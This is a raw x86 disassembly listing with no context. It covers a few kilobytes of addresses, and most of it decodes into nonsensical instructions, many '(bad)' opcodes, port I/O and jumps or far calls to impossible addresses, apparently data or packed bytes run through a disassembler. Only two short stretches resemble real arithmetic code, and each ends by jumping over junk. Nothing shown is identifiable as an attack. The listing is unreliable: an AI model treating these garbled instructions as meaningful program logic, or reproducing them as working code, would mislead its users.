  40fd28:	fmul   QWORD PTR [ecx+0x646440a3]
  40fd2e:	retf   0x8ff0
  40fd31:	cmp    al,0x79
  40fd33:	gs loop 0x40fd12
  40fd36:	rol    DWORD PTR [edi],1
  40fd38:	gs fcmovbe st,st(7)
  40fd3b:	jae    0x40fd08
  40fd3d:	xchg   edx,eax
  40fd3e:	jl     0x40fcc6
  40fd40:	push   0xce2593ce
  40fd45:	mov    bl,0x16
  40fd47:	cld    
  40fd48:	sub    ecx,ebx
  40fd4a:	rcl    DWORD PTR [ecx-0x6866041c],0xc6
  40fd51:	mov    al,ds:0xf4bad042
  40fd56:	mov    ecx,0x926d5c7a
  40fd5b:	jge    0x40fd3b
  40fd5d:	lahf   
  40fd5e:	dec    eax
  40fd5f:	lods   eax,DWORD PTR ds:[esi]
  40fd60:	ficom  WORD PTR [eax]
  40fd62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd63:	les    eax,FWORD PTR [ecx+0x375743bd]
  40fd69:	dec    esi
  40fd6a:	(bad)  
  40fd6b:	cdq    
  40fd6c:	es pushf 
  40fd6e:	lods   al,BYTE PTR ds:[esi]
  40fd6f:	adc    al,0xd8
  40fd71:	xchg   esp,eax
  40fd72:	data16 div BYTE PTR [esp+ebp*2]
  40fd76:	and    ecx,DWORD PTR [ebp+ebp*1+0x373f6bc4]
  40fd7d:	(bad)  
  40fd7e:	or     al,0x25
  40fd80:	mov    cl,BYTE PTR [ebp+esi*1+0x2e425e8a]
  40fd87:	sbb    DWORD PTR [ebx],edi
  40fd89:	test   eax,0xc995bf1b
  40fd8e:	mov    ah,0xe7
  40fd90:	pop    ebx
  40fd91:	aaa    
  40fd92:	popa   
  40fd93:	mov    dl,0xe6
  40fd95:	stos   BYTE PTR es:[edi],al
  40fd96:	sar    BYTE PTR [esi-0x3bf8156f],0xf1
  40fd9d:	addr16 xchg esi,eax
  40fd9f:	loop   0x40fdb9
  40fda1:	push   edi
  40fda2:	pop    esp
  40fda3:	test   al,0xfd
  40fda5:	jge    0x40fd64
  40fda7:	pop    esi
  40fda8:	xchg   ecx,eax
  40fda9:	repnz fnstenv [ecx-0x26d14e82]
  40fdb0:	mul    BYTE PTR [eax-0x5a]
  40fdb3:	pop    ds
  40fdb4:	and    ebx,DWORD PTR [ebp-0x32]
  40fdb7:	and    ebp,ebx
  40fdb9:	cs push es
  40fdbb:	imul   ecx,DWORD PTR [esi],0x3a98b9d7
  40fdc1:	leave  
  40fdc2:	mov    BYTE PTR [ecx+0x67f882d9],al
  40fdc8:	jno    0x40fdf1
  40fdca:	mov    bl,0x9a
  40fdcc:	test   DWORD PTR [esi-0x2d658718],edi
  40fdd2:	jg     0x40fe3c
  40fdd4:	add    ch,BYTE PTR [esi]
  40fdd6:	xor    ebp,edi
  40fdd8:	cmp    BYTE PTR cs:[edx],0x19
  40fddc:	jmp    0x7773eb08
  40fde1:	cwde   
  40fde2:	mov    eax,ds:0x52ffcd1a
  40fde7:	iret   
  40fde8:	or     eax,ecx
  40fdea:	mov    ecx,DWORD PTR [ebp-0x20]
  40fded:	mov    ecx,DWORD PTR [ebp-0x1c]
  40fdf0:	and    edx,0x76f2
  40fdf6:	or     edx,edi
  40fdf8:	xor    edx,esi
  40fdfa:	xor    eax,0x253b
  40fdff:	shld   edx,eax,0x2
  40fe03:	shl    eax,0x2
  40fe06:	shr    ecx,0x1e
  40fe09:	xor    esi,esi
  40fe0b:	or     eax,ecx
  40fe0d:	or     edx,esi
  40fe0f:	xor    eax,0xcb79b576
  40fe14:	mov    DWORD PTR [ebp-0x20],eax
  40fe17:	mov    esi,0x9c2b8ae8
  40fe1c:	xor    edx,esi
  40fe1e:	mov    DWORD PTR [ebp-0x1c],edx
  40fe21:	mov    eax,DWORD PTR [ebp-0x38]
  40fe24:	mov    ecx,DWORD PTR [ebp-0x34]
  40fe27:	mov    edx,DWORD PTR [ebp-0x40]
  40fe2a:	mov    edi,DWORD PTR [ebp-0x3c]
  40fe2d:	push   edi
  40fe2e:	push   edx
  40fe2f:	push   ecx
  40fe30:	push   eax
  40fe31:	call   0x41594e
  40fe36:	add    eax,0x536a
  40fe3b:	adc    edx,0x9573
  40fe41:	push   0x12613
  40fe46:	push   0xae21daec
  40fe4b:	push   edx
  40fe4c:	push   eax
  40fe4d:	call   0x422220
  40fe52:	mov    ecx,eax
  40fe54:	mov    eax,DWORD PTR [ebp-0x20]
  40fe57:	mov    ebx,DWORD PTR [ebp-0x1c]
  40fe5a:	xor    ecx,0x1b8b
  40fe60:	xor    edi,edi
  40fe62:	xor    edx,edi
  40fe64:	add    ecx,eax
  40fe66:	mov    eax,DWORD PTR [ebp+0xc]
  40fe69:	adc    edx,ebx
  40fe6b:	mov    DWORD PTR [eax],ecx
  40fe6d:	mov    DWORD PTR [eax+0x4],edx
  40fe70:	mov    eax,DWORD PTR [ebp-0x30]
  40fe73:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fe76:	mov    edx,0xbdb2
  40fe7b:	sub    edx,eax
  40fe7d:	jmp    0x410231
  40fe82:	(bad)  
  40fe83:	out    dx,eax
  40fe84:	ins    BYTE PTR es:[edi],dx
  40fe85:	and    BYTE PTR [esp+edi*4+0x3f7f08b],bh
  40fe8c:	or     bh,0x3c
  40fe8f:	mov    esi,0x2ca4d16a
  40fe94:	mov    esi,0xbec4e3be
  40fe99:	mov    esi,0xd979f85d
  40fe9e:	mov    cl,0xd9
  40fea0:	aaa    
  40fea1:	mov    ds:0x72b33f12,eax
  40fea6:	and    al,0xf
  40fea8:	xchg   edx,eax
  40fea9:	pop    ecx
  40feaa:	add    BYTE PTR [edx+0x1d],0x39
  40feae:	jmp    0xc82a1a23
  40feb3:	fs lahf 
  40feb5:	ss pop es
  40feb7:	aas    
  40feb8:	or     eax,DWORD PTR [eax+ebx*8]
  40febb:	sahf   
  40febc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40febd:	call   0xe9560a67
  40fec2:	in     al,0x9a
  40fec4:	sbb    esi,DWORD PTR [esi-0x1becb828]
  40feca:	(bad)  
  40fecb:	mov    bh,0xb3
  40fecd:	cli    
  40fece:	std    
  40fecf:	call   0xf67667cf
  40fed4:	mov    cs,WORD PTR fs:[ebp+edi*1+0x40fec0b5]
  40fedc:	int    0x47
  40fede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fedf:	ja     0x40ff5c
  40fee1:	and    BYTE PTR [edx],cl
  40fee3:	retf   
  40fee4:	sub    BYTE PTR [edi],ch
  40fee6:	in     al,0xe0
  40fee8:	sti    
  40fee9:	pop    edi
  40feea:	xor    BYTE PTR [eax+0x2ef277fd],0x96
  40fef1:	add    eax,0x8bc2e634
  40fef6:	ds jl  0x40fed6
  40fef9:	inc    eax
  40fefa:	and    DWORD PTR [esi+ecx*8+0x73],ebx
  40fefe:	jp     0x40ff5b
  40ff00:	or     dl,ch
  40ff02:	mov    WORD PTR [edi-0x7f572a8e],fs
  40ff08:	je     0x40ff79
  40ff0a:	cmp    ebx,DWORD PTR ds:0xac17a4e8
  40ff10:	stc    
  40ff11:	retf   
  40ff12:	push   cs
  40ff13:	mov    ebx,0x1cbacf28
  40ff18:	repz add eax,0xde7fb767
  40ff1e:	test   al,0x31
  40ff20:	xlat   BYTE PTR ds:[ebx]
  40ff21:	dec    esp
  40ff22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff23:	pop    edi
  40ff24:	and    esp,edx
  40ff26:	cmp    dl,ch
  40ff28:	xor    eax,0xf61ff9c1
  40ff2d:	sub    al,0x7d
  40ff2f:	das    
  40ff30:	ins    DWORD PTR es:[edi],dx
  40ff31:	sbb    eax,0x93d53db3
  40ff36:	ret    0x237d
  40ff39:	mov    ah,0x43
  40ff3b:	inc    eax
  40ff3c:	leave  
  40ff3d:	xchg   BYTE PTR [ebx],al
  40ff3f:	je     0x40ff15
  40ff41:	aad    0xfe
  40ff43:	(bad)  
  40ff44:	and    al,0x5d
  40ff46:	(bad)  [esi]
  40ff48:	or     al,0xfe
  40ff4a:	push   edx
  40ff4b:	mov    bh,0xd2
  40ff4d:	ds aad 0xee
  40ff50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff51:	jbe    0x40ff3d
  40ff53:	inc    ebx
  40ff54:	mov    dl,0xd
  40ff56:	popa   
  40ff57:	mov    eax,ds:0xbf0c6b53
  40ff5c:	inc    edx
  40ff5d:	adc    eax,0xa8883587
  40ff62:	mov    esi,0xaa693fa9
  40ff67:	iret   
  40ff68:	xor    eax,0x4f1f337f
  40ff6d:	xchg   edi,eax
  40ff6e:	cmp    DWORD PTR [eax-0x3efd1408],ecx
  40ff74:	jb     0x40ffb0
  40ff76:	adc    edx,ecx
  40ff78:	std    
  40ff79:	inc    esi
  40ff7a:	mov    cl,dh
  40ff7c:	call   0x5f87:0x25228cc2
  40ff83:	sbb    eax,ebx
  40ff85:	nop
  40ff86:	in     eax,dx
  40ff87:	sahf   
  40ff88:	dec    edi
  40ff89:	adc    DWORD PTR [ecx-0x29],esi
  40ff8c:	dec    eax
  40ff8d:	in     eax,dx
  40ff8e:	mov    al,BYTE PTR [ebp-0x52e06a62]
  40ff94:	popa   
  40ff95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff96:	adc    eax,0x5d89f0c2
  40ff9b:	mov    ecx,0x1bb235f6
  40ffa0:	jno    0x40ff7a
  40ffa2:	popa   
  40ffa3:	add    bh,bl
  40ffa5:	mov    esi,0xa3de6456
  40ffaa:	jmp    0x40ff2c
  40ffac:	inc    ecx
  40ffad:	mov    esp,0x6b81de9
  40ffb2:	mov    ds:0x883173a1,eax
  40ffb7:	cli    
  40ffb8:	jge    0x40ff62
  40ffba:	inc    eax
  40ffbb:	pop    es
  40ffbc:	or     al,0x1a
  40ffbe:	bound  esp,QWORD PTR [edi+0x7d6fbece]
  40ffc4:	or     DWORD PTR [eax+0x78],eax
  40ffc7:	nop
  40ffc8:	jnp    0x40ff86
  40ffca:	and    al,0x9f
  40ffcc:	add    bl,dh
  40ffce:	sbb    DWORD PTR [eax+0x6d8150b6],esi
  40ffd4:	push   0xcbc2a976
  40ffd9:	cmp    al,0x6
  40ffdb:	push   es
  40ffdc:	call   DWORD PTR [ebp-0x6f]
  40ffdf:	or     eax,esp
  40ffe1:	mov    DWORD PTR [esi],ecx
  40ffe3:	pop    ebx
  40ffe4:	jns    0x40ffcc
  40ffe6:	xchg   edi,eax
  40ffe7:	loop   0x40ffe3
  40ffe9:	jg     0x410049
  40ffeb:	stos   BYTE PTR es:[edi],al
  40ffec:	sbb    DWORD PTR [edi+0x18],edi
  40ffef:	jmp    0x410003
  40fff1:	repz mov bh,0xd0
  40fff4:	xchg   ecx,eax
  40fff5:	push   edi
  40fff6:	int    0x90
  40fff8:	mov    ?,WORD PTR cs:[ecx-0x1fa0fccb]
  40ffff:	or     BYTE PTR [eax+ebx*2-0x7375fcdc],bl
  410006:	lods   eax,DWORD PTR ds:[esi]
  410007:	mov    ds:0x727587f,eax
  41000c:	xor    al,al
  41000e:	jle    0x410051
  410010:	cmp    dl,dh
  410012:	out    dx,al
  410013:	dec    eax
  410014:	scas   al,BYTE PTR es:[edi]
  410015:	or     BYTE PTR [edx+0x1a],ah
  410018:	xchg   esp,eax
  410019:	addr16 lock in al,dx
  41001c:	and    ch,al
  41001e:	push   0xbaec804c
  410023:	repnz inc cx
  410026:	push   edi
  410027:	cs leave 
  410029:	jmp    0x41003f
  41002b:	xchg   ecx,eax
  41002c:	rcl    DWORD PTR [eax+eiz*8],cl
  41002f:	scas   eax,DWORD PTR es:[edi]
  410030:	mov    ebp,0x462bad9b
  410035:	fbstp  TBYTE PTR ds:0xfc03069f
  41003b:	xchg   ebx,eax
  41003d:	iret   
  41003e:	test   BYTE PTR [ebx],dh
  410040:	jno    0x410003
  410042:	add    esi,DWORD PTR [eax-0x71]
  410045:	ret    
  410046:	jno    0x410050
  410048:	add    al,0x44
  41004a:	jmp    0x410002
  41004c:	mov    ebp,0x178c583b
  410051:	hlt    
  410052:	or     esi,DWORD PTR [ebx+0xbda1f68]
  410058:	nop
  410059:	sub    DWORD PTR [ecx-0x30],0x95b2e835
  410060:	rol    BYTE PTR [ecx],0xfd
  410063:	cmp    DWORD PTR [ecx+0x66cc244],0xf296012c
  41006d:	adc    dh,BYTE PTR [edx-0x7e]
  410070:	mov    ecx,0xec21844b
  410075:	arpl   ax,di
  410077:	inc    ebp
  410078:	bound  esp,QWORD PTR [eax+esi*2+0x7a0abc72]
  41007f:	js     0x410064
  410081:	push   esp
  410082:	seta   BYTE PTR [edx]
  410085:	test   eax,0x900780ae
  41008a:	ror    DWORD PTR [eax+0x47],1
  41008d:	adc    edi,DWORD PTR [ebp-0x7a]
  410090:	xor    al,0xd8
  410092:	lahf   
  410093:	aad    0xb8
  410095:	xor    eax,0xeb876f73
  41009a:	push   ss
  41009b:	mov    cl,0x23
  41009d:	sbb    eax,0x3808195f
  4100a2:	fdiv   QWORD PTR [eax+0x22]
  4100a5:	xchg   ebp,eax
  4100a6:	jno    0x410127
  4100a8:	sub    DWORD PTR [edx+eax*1-0x57],edx
  4100ac:	ds or  ah,bh
  4100af:	stc    
  4100b0:	aad    0x12
  4100b2:	sub    ah,BYTE PTR [esi-0x74187859]
  4100b8:	sub    BYTE PTR [eax],al
  4100ba:	data16 mov bh,0x6e
  4100bd:	in     eax,0x89
  4100bf:	adc    DWORD PTR [eax-0x5fae381c],edx
  4100c5:	inc    edi
  4100c6:	fmul   QWORD PTR [ebx+0x13]
  4100c9:	jbe    0x410088
  4100cb:	mov    edx,0x359f3d93
  4100d0:	fst    DWORD PTR [edx+0x1f]
  4100d3:	sub    DWORD PTR [esi-0x44299aba],edx
  4100d9:	adc    ecx,eax
  4100db:	jmp    FWORD PTR [eax+0x535d9929]
  4100e1:	out    dx,eax
  4100e2:	inc    esp
  4100e3:	loop   0x4100d7
  4100e5:	xor    DWORD PTR [ebp-0x23],ebx
  4100e8:	in     al,dx
  4100e9:	in     al,0x14
  4100eb:	fcomp  QWORD PTR [edx]
  4100ed:	aam    0x87
  4100ef:	or     al,0xcf
  4100f1:	loop   0x4100f3
  4100f3:	push   ebx
  4100f4:	xor    ecx,DWORD PTR [ebx+0x2cf4df6d]
  4100fa:	mov    cl,0x78
  4100fc:	xchg   esi,eax
  4100fd:	ja     0x4100ab
  4100ff:	data16 mov ds,WORD PTR [eax]
  410102:	sbb    DWORD PTR [edx-0x12acce9c],eax
  410108:	loop   0x410117
  41010a:	pop    ebp
  41010b:	jg     0x410136
  41010d:	int    0x29
  41010f:	outs   dx,BYTE PTR ds:[esi]
  410110:	jno    0x4100eb
  410112:	gs pop ecx
  410114:	ret    0xc573
  410117:	cmc    
  410118:	push   0x36
  41011a:	ins    BYTE PTR es:[edi],dx
  41011b:	nop
  41011c:	gs cmc 
  41011e:	push   ebx
  41011f:	xchg   ecx,eax
  410120:	fld    DWORD PTR [eax-0xd]
  410123:	xchg   ebp,eax
  410124:	leave  
  410125:	cmc    
  410126:	cwde   
  410127:	inc    ebp
  410128:	and    eax,0x7e190ff6
  41012d:	add    al,0xfa
  41012f:	popa   
  410130:	xchg   edi,eax
  410131:	or     al,0x26
  410133:	stos   BYTE PTR es:[edi],al
  410134:	leave  
  410135:	pop    ebp
  410136:	xchg   DWORD PTR [ebx-0xd],esp
  410139:	(bad)  
  41013a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013b:	(bad)  
  41013c:	stc    
  41013d:	in     al,0xb
  41013f:	xor    ah,BYTE PTR [esi]
  410141:	xchg   bh,dl
  410143:	sub    al,0xef
  410145:	fiadd  DWORD PTR [esi+0x57]
  410148:	ror    DWORD PTR [ecx],0xb3
  41014b:	xor    edi,DWORD PTR [esp+ebp*2]
  41014e:	sbb    al,0xcf
  410150:	cmc    
  410151:	dec    edi
  410152:	pop    esp
  410153:	add    eax,0x3386d251
  410158:	xchg   BYTE PTR [edi-0x1f],dl
  41015b:	sub    edx,DWORD PTR [eax-0x36ba59a0]
  410161:	fist   WORD PTR [eax]
  410163:	lock stc 
  410165:	sub    BYTE PTR [esi],al
  410167:	cmp    eax,0xbe965c77
  41016c:	xor    eax,0x3c9401ae
  410171:	xor    ebp,ecx
  410173:	or     BYTE PTR [esi-0x1b],dh
  410176:	mov    cl,0x51
  410178:	mov    ch,0xb
  41017a:	pop    eax
  41017b:	mov    ebx,0xde8d652e
  410180:	data16 aas 
  410182:	add    al,0x6a
  410184:	sbb    al,0x4a
  410186:	dec    edx
  410187:	push   eax
  410188:	js     0x41012f
  41018a:	mov    eax,0x93a10805
  41018f:	je     0x410116
  410191:	or     DWORD PTR [ecx-0x66],0xe
  410195:	dec    ecx
  410196:	in     eax,dx
  410197:	pop    ecx
  410198:	imul   esp,DWORD PTR [edx-0x19e7bb85],0x5e
  41019f:	xchg   edi,eax
  4101a0:	lods   al,BYTE PTR ds:[esi]
  4101a1:	pop    ss
  4101a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101a3:	jbe    0x4101bc
  4101a5:	jmp    0xf3e4c04c
  4101aa:	adc    al,bl
  4101ac:	push   eax
  4101ad:	mov    ch,0x76
  4101af:	inc    edi
  4101b0:	mov    edi,DWORD PTR [eax+0x45]
  4101b3:	out    dx,al
  4101b4:	sbb    DWORD PTR [eax-0x4d83f94c],edx
  4101ba:	out    dx,eax
  4101bb:	sub    dl,al
  4101bd:	bound  edi,QWORD PTR [edi-0x42]
  4101c0:	aas    
  4101c1:	fcmove st,st(5)
  4101c3:	inc    ebp
  4101c4:	and    al,0x6f
  4101c6:	outs   dx,BYTE PTR ds:[esi]
  4101c7:	push   0xffffff92
  4101c9:	mov    ebx,0x38852b1e
  4101ce:	add    bh,BYTE PTR [eax-0x3c307716]
  4101d4:	or     eax,0xe00df2d8
  4101d9:	adc    DWORD PTR [edi+0x15384955],0xb479fee3
  4101e3:	out    0xe1,eax
  4101e5:	mov    DWORD PTR [esi],edi
  4101e7:	mov    WORD PTR [edi],?
  4101e9:	outs   dx,BYTE PTR ds:[esi]
  4101ea:	and    al,0xf2
  4101ec:	xor    ebp,DWORD PTR [edx]
  4101ee:	and    al,0x9a
  4101f0:	int3   
  4101f1:	xlat   BYTE PTR ds:[ebx]
  4101f2:	mov    eax,0xb2a0b294
  4101f7:	jne    0x410242
  4101f9:	ror    BYTE PTR [ebx+0x9924ee6],cl
  4101ff:	add    al,0x53
  410201:	xor    DWORD PTR [eax+ebp*1],ebx
  410204:	xor    BYTE PTR [eax],0x33
  410207:	pop    ecx
  410208:	les    ebx,FWORD PTR [edi-0x28]
  41020b:	cli    
  41020c:	pop    ds
  41020d:	enter  0xa779,0x95
  410211:	inc    edx
  410212:	enter  0x72ea,0x3c
  410216:	cmp    ah,BYTE PTR [esi-0x638a0f50]
  41021c:	xchg   edi,eax
  41021d:	js     0x410276
  41021f:	inc    ebx
  410220:	mov    al,ds:0xebe6b752
  410225:	jno    0x4101d5
  410227:	jnp    0x41025c
  410229:	icebp  
  41022a:	adc    al,0x3
  41022c:	xor    BYTE PTR [ecx-0x74cacfcb],0x45
  410233:	fdivr  DWORD PTR [ebx+0x4c02]
  410239:	sbb    ebx,ecx
  41023b:	mov    ecx,DWORD PTR [ebp-0x24]
  41023e:	sub    edx,eax
  410240:	mov    eax,DWORD PTR [ebp+0xc]
  410243:	sbb    ebx,ecx
  410245:	add    edx,DWORD PTR [eax]
  410247:	mov    ecx,DWORD PTR [ebp-0x28]
  41024a:	adc    ebx,DWORD PTR [eax+0x4]
  41024d:	push   0x2
  41024f:	xor    ebx,esi
  410251:	mov    esi,DWORD PTR [ebp-0x24]
  410254:	pop    esi
  410255:	sub    esi,ecx
  410257:	mov    ecx,DWORD PTR [ebp-0x30]
  41025a:	sub    esi,ecx
  41025c:	mov    eax,ebx
  41025e:	jmp    0x410612
  410263:	sub    DWORD PTR [esi-0x65853526],eax
  410269:	cmp    DWORD PTR [esi-0x6df308e8],esp
  41026f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  410271:	jbe    0x410205
  410273:	leave  
  410274:	xor    al,0xbe
  410276:	mov    esi,0xbebec4e3
  41027b:	adc    BYTE PTR [ebp-0x55],0xda
  41027f:	loop   0x4102f2
  410281:	loop   0x4102b2
  410283:	jno    0x41023b
  410285:	jmp    0xf27daf89
  41028a:	bound  esp,QWORD PTR [ebp+0x11]
  41028d:	xchg   edi,eax
  41028e:	les    ebx,FWORD PTR [ebx+0x7d141341]
  410294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410295:	inc    ebp
  410296:	or     al,0x40
  410298:	(bad)  
  410299:	cmp    eax,0x4578ab91
  41029e:	mov    edi,0x87108c13
  4102a3:	popf   
  4102a4:	dec    eax
  4102a5:	push   ebp
  4102a6:	fwait
  4102a7:	sub    ah,dl
  4102a9:	xor    BYTE PTR [edx+eax*1-0x34],ch
  4102ad:	dec    ebx
  4102ae:	in     eax,0x8e
  4102b0:	aad    0xa0
  4102b2:	imul   DWORD PTR [ecx-0x29]
  4102b5:	dec    edi
  4102b6:	loopne 0x410260
  4102b8:	iret   
  4102b9:	push   es
  4102ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102bb:	push   edi
  4102bc:	adc    edx,DWORD PTR [esi+ecx*1+0x36b73114]
  4102c3:	pop    ss
  4102c4:	shl    DWORD PTR [esi],0x62
  4102c7:	push   esi
  4102c8:	sub    eax,0xc01620d4
  4102cd:	or     eax,0xb0d9f92c
  4102d2:	adc    eax,0xcae8a5fc
  4102d7:	mov    cl,0xd8
  4102d9:	in     al,0x63
  4102db:	inc    ebx
  4102dc:	jp     0x41029c
  4102de:	mov    ds:0xa28ddba6,al
  4102e3:	fwait
  4102e4:	stos   BYTE PTR es:[edi],al
  4102e5:	inc    edi
  4102e6:	(bad)  
  4102e7:	dec    edi
  4102e8:	clc    
  4102e9:	out    dx,eax
  4102ea:	dec    eax
  4102eb:	jbe    0x41026e
  4102ed:	dec    edi
  4102ee:	xchg   ecx,eax
  4102ef:	add    BYTE PTR [ebx+esi*8+0x3e],0xaf
  4102f4:	imul   DWORD PTR [ecx+0x27]
  4102f7:	aad    0x21
  4102f9:	fnstsw WORD PTR [edi-0x10fe8360]
  4102ff:	sbb    ah,0xb2
  410302:	retf   
  410303:	lods   eax,DWORD PTR ds:[esi]
  410304:	pop    esi
  410305:	push   0xffffffe4
  410307:	fiadd  DWORD PTR [esp+eiz*2+0x68a3d3dc]
  41030e:	mov    eax,ds:0xe9bb54a3
  410313:	xchg   ebx,eax
  410314:	dec    ebp
  410315:	pop    ss
  410316:	stos   DWORD PTR es:[edi],eax
  410317:	out    0x72,al
  410319:	add    bh,BYTE PTR [ebp+0x52]
  41031c:	push   eax
  41031d:	or     eax,0x1049659e
  410322:	cmp    ah,0x91
  410325:	shl    DWORD PTR ds:0x262eae05,0xc3
  41032c:	jmp    0xc2bc07f6
  410331:	inc    eax
  410332:	nop
  410333:	xor    esp,esi
  410335:	adc    al,0xad
  410337:	outs   dx,DWORD PTR ds:[esi]
  410338:	mov    ah,0x4f
  41033a:	outs   dx,BYTE PTR fs:[esi]
  41033c:	pop    edi
  41033d:	jb     0x410349
  41033f:	idiv   DWORD PTR [eax+0x6b]
  410342:	(bad)  
  410343:	out    dx,al
  410344:	mov    ebx,0x735b1a93
  410349:	ret    
  41034a:	push   cs
  41034b:	(bad)  
  41034e:	inc    eax
  41034f:	jp     0x4102d8
  410351:	sub    DWORD PTR [esi+edi*4],ebx
  410354:	mov    edx,0xcbd120de
  410359:	out    dx,al
  41035a:	call   0x8c51:0x339d6e7b
  410361:	in     eax,dx
  410362:	sub    esp,esi
  410364:	pop    ebx
  410365:	stc    
  410366:	(bad)  
  410367:	and    dh,BYTE PTR gs:[ebx-0x1d]
  41036b:	push   0x29
  41036d:	mov    edx,0xa02cf985
  410372:	mov    edx,0x42127cc8
  410377:	ror    BYTE PTR [esi-0x6cb28b99],cl
  41037d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41037e:	adc    BYTE PTR [ecx-0x5e713e6],bh
  410384:	ss retf 0x3533
  410388:	inc    ebx
  410389:	adc    eax,0x70f24372
  41038e:	mov    edi,0x41a9bff6
  410393:	xor    al,BYTE PTR [esi+edx*1-0x28e875e3]
  41039a:	jnp    0x410330
  41039c:	sar    edi,1
  41039e:	mov    BYTE PTR [ebp+0xa0aa51e],bh
  4103a4:	adc    ebp,esp
  4103a6:	popa   
  4103a7:	sub    al,0x20
  4103a9:	shl    BYTE PTR [esi],cl
  4103ab:	inc    ebp
  4103ac:	lds    ecx,FWORD PTR [ecx]
  4103ae:	aad    0xfd
  4103b0:	jno    0x4103c7
  4103b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103b3:	push   edx
  4103b4:	test   DWORD PTR [ecx-0x5b],ebx
  4103b7:	ja     0x41036b
  4103b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103ba:	inc    esi
  4103bb:	gs adc al,0x21
  4103be:	lods   eax,DWORD PTR ds:[esi]
  4103bf:	mov    bl,0xfa
  4103c1:	push   ebx
  4103c2:	and    eax,0xf38c5d72
  4103c7:	cmp    edx,esi
  4103c9:	cdq    
  4103ca:	je     0x41039a
  4103cc:	xor    al,0xbd
  4103ce:	cs or  eax,0x97b7fab1
  4103d4:	repz pop ebx
  4103d6:	imul   edi,DWORD PTR [esi],0xfadf352d
  4103dc:	std    
  4103dd:	xor    al,0x83
  4103df:	lea    esp,[eax]
  4103e1:	aaa    
  4103e2:	lods   al,BYTE PTR ds:[esi]
  4103e3:	dec    eax
  4103e4:	and    DWORD PTR [ebp+0x4d],esp
  4103e7:	icebp  
  4103e8:	fldenv [edx-0x31]
  4103eb:	int    0xd6
  4103ed:	ret    
  4103ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103ef:	dec    ebp
  4103f0:	sahf   
  4103f1:	clc    
  4103f2:	repz push esi
  4103f4:	sti    
  4103f5:	pop    edx
  4103f6:	loopne 0x4103b2
  4103f8:	test   al,0x98
  4103fa:	imul   ebx,DWORD PTR [ebx+0x5f47d935],0xffffffc2
  410401:	add    DWORD PTR [ecx],edx
  410403:	mov    ebp,0xff1687db
  410408:	mov    al,ds:0x9959ab8b
  41040e:	pushf  
  41040f:	gs cwde 
  410411:	ds sub ah,ch
  410414:	sub    al,0x9d
  410416:	std    
  410417:	pop    esp
  410418:	add    bh,al
  41041a:	das    
  41041b:	rol    ch,0xdf
  41041e:	xchg   DWORD PTR [ebx+0x236215a2],esi
  410424:	fs pop ebp
  410426:	fsubrp st(4),st
  410428:	je     0x410431
  41042a:	inc    ebp
  41042b:	mov    dl,0xa7
  41042d:	adc    al,BYTE PTR [ecx]
  41042f:	pop    esi
  410430:	push   ds
  410431:	xor    ch,BYTE PTR [edx+0x23]
  410434:	pop    esi
  410435:	sub    BYTE PTR [ecx-0x172d96a8],bh
  41043b:	into   
  41043c:	jbe    0x4103ed
  41043e:	cwde   
  41043f:	std    
  410440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410441:	test   DWORD PTR [edi+edi*2],esi
  410444:	lods   eax,DWORD PTR ds:[esi]
  410445:	inc    esp
  410446:	mov    ah,0xab
  410448:	lods   eax,DWORD PTR ds:[esi]
  410449:	jno    0x4103fc
  41044b:	lahf   
  41044c:	retf   0xd6d3
  41044f:	dec    edx
  410450:	add    eax,0x6d77c185
  410455:	inc    esi
  410456:	jae    0x4104b9
  410458:	mov    edx,0x1f6b1a77
  41045d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41045e:	je     0x410400
  410460:	pop    ss
  410461:	mov    ss,esp
  410463:	jp     0x410457
  410465:	cmc    
  410466:	xor    al,0x94
  410468:	mov    edx,0x26a58436
  41046d:	jle    0x4103f3
  41046f:	outs   dx,DWORD PTR ds:[esi]
  410470:	test   DWORD PTR [ebx],esi
  410472:	push   eax
  410473:	adc    ecx,DWORD PTR [ecx]
  410475:	rol    BYTE PTR [eax-0x68],0xda
  410479:	push   ebp
  41047a:	mov    ah,0x35
  41047c:	popf   
  41047d:	push   ss
  41047e:	push   eax
  41047f:	mov    ah,BYTE PTR [eax+eax*1+0x2e]
  410483:	lods   eax,DWORD PTR ds:[esi]
  410484:	dec    edx
  410485:	into   
  410486:	or     ebx,DWORD PTR [eax-0x80]
  410489:	out    0xe2,eax
  41048b:	dec    eax
  41048c:	test   al,0xe0
  41048e:	and    BYTE PTR [esi],bh
  410490:	adc    al,BYTE PTR [esi]
  410492:	mov    ds:0xbca05ea1,eax
  410497:	jae    0x410491
  410499:	push   esp
  41049a:	popa   
  41049b:	int3   
  41049c:	lds    esi,FWORD PTR [ecx+0x79d89895]
  4104a2:	ficomp WORD PTR [ebp+0x61]
  4104a5:	stc    
  4104a6:	dec    esi
  4104a7:	mov    bl,0x37
  4104a9:	fmul   QWORD PTR [esp+eiz*4+0x3c]
  4104ad:	cdq    
  4104ae:	stos   BYTE PTR es:[edi],al
  4104af:	jo     0x41052a
  4104b1:	stc    
  4104b2:	add    esp,DWORD PTR [eax+0x5338bc89]
  4104b8:	outs   dx,DWORD PTR ds:[esi]
  4104b9:	cld    
  4104ba:	dec    esi
  4104bb:	test   DWORD PTR [esi+0x50],0x84f713b7
  4104c2:	jp     0x4104dd
  4104c4:	pop    eax
  4104c5:	jb     0x410451
  4104c7:	(bad)  
  4104c9:	jp     0x4104cb
  4104cb:	mov    esi,0x2abacb9c
  4104d0:	jno    0x41046f
  4104d2:	sbb    al,0xb0
  4104d4:	addr16 sub al,0x3d
